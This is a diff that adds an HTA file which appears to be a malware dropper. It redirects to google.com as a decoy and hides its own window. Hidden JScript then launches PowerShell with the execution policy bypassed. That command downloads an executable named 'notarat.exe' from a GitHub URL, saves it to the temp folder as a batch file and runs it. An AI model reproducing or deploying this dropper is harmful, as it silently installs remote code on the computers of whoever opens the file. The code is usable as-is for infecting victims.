@@ -1,0 +1,16 @@
+<html>
+<head>
+<HTA:APPLICATION>
+<meta http-equiv="refresh" content="0;url=https://google.com">
+<script language="jscript">
+var url = "https://raw.githubusercontent.com/sinnaiah/a/refs/heads/main/notarat.exe";
+var filename = "curl.bat";
+var command = "conhost.exe --headless cmd.exe /c powershell.exe -w h -ep bypass -c \"$t=Join-Path $env:TEMP '" + filename + "';Invoke-WebRequest -Uri '" + url + "' -OutFile $t -UseBasicParsing;if(Test-Path $t){& conhost.exe --headless cmd.exe /c $t}\"";
+
+new ActiveXObject("WScript.Shell").Run(command, 0, false);
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
